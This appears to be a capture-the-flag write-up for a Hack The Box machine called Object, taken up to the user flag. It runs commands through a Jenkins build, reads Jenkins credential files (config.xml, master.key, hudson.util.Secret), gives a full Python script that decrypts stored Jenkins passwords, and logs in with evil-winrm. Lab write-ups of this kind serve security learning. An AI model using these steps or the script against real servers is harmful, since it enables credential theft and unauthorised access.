# Obejct (Full Pwn)

## User

Starting with nmap to scan for open we have have 2 ports open, 80 and 8080.

![nmap](0.png)

In port 80 there is nothing interesting so we move to port 8080 which is a jenkins ci/cd platform.

![jenkins_landing_page](1.png)

We create a new account to use jenkins for building new projects. We create a new project with name test2. In the configuration page we set the Build Triggers to Trigger Build remotely and add the authentication token with name test. At Build section we add an Execute Windows Batch Command and add the command whoami. Then save the project.

![jenkins_landing_page](3.png)
![jenkins_landing_page](3.1.png)

Next we create the API token, in My Views -> New View -> Configure.

![jenkins_landing_page](4.png)

Finally we can run the request to build remotely with the API token.

` curl http://test:114adaa6de596d28727346566f6c6d7d84@object.htb:8080/job/test2/build?token=test `

Going to project test2 and see the last build and check the console output.

![jenkins_landing_page](6.png)


We got command execution. 

We then must find where the admins credentials locate with ` where ` command:

` where /R c:\users\oliver\AppData\Local\Jenkins *.xml `

We got the admin_17207690984073220035 directory and we just read the xml file to get the credentials.

` cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml" `

![jenkins_landing_page](7.png)

` oliver:AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA= `

We also need the master.key and hudson.util.Secret to decrypt the password

` cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key" `

` powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c" `

Now we can decrypt oliver's password.

``` 
import re, sys, base64
from hashlib import sha256
from binascii import hexlify, unhexlify
from Crypto.Cipher import AES

def decryptNewPassword(secret, p):
    p = p[1:] #Strip the version
    iv_length = ((p[0] & 0xff) << 24) | ((p[1] & 0xff) << 16) | ((p[2] & 0xff) << 8) | (p[3] & 0xff)
    p = p[4:]
    data_length = ((p[0] & 0xff) << 24) | ((p[1] & 0xff) << 16) | ((p[2] & 0xff) << 8) | (p[3] & 0xff)
    p = p[4:]
    iv = p[:iv_length]
    p = p[iv_length:]
    o = AES.new(secret, AES.MODE_CBC, iv)
    decrypted_p = o.decrypt(p)

    fully_decrypted_blocks = decrypted_p[:-16]
    possibly_padded_block = decrypted_p[-16:]
    padding_length = possibly_padded_block[-1]
    if padding_length <= 16: # Less than size of one block, so we have padding
        possibly_padded_block = possibly_padded_block[:-padding_length]

    pw = fully_decrypted_blocks + possibly_padded_block
    return pw


hudson_secret_key = open("hudson.util.Secret", 'rb').read()
hashed_master_key = sha256(b"f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19").digest()[:16]
o = AES.new(hashed_master_key, AES.MODE_ECB)
secret = o.decrypt(hudson_secret_key)
print(secret)

secret = secret[:-16]
secret = secret[:16]


password = base64.b64decode("AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=")

print(decryptNewPassword(secret, password).decode())
```

After the password decrypting we can evil-winrm to the machine as oliver.

` evil-winrm -i object.htb -u oliver -p c1cdfun_d2434 `

We can grab the user flag.

` type C:\Users\oliver\Desktop\user.txt `

**HTB{c1_cd_c00k3d_up_1337!}**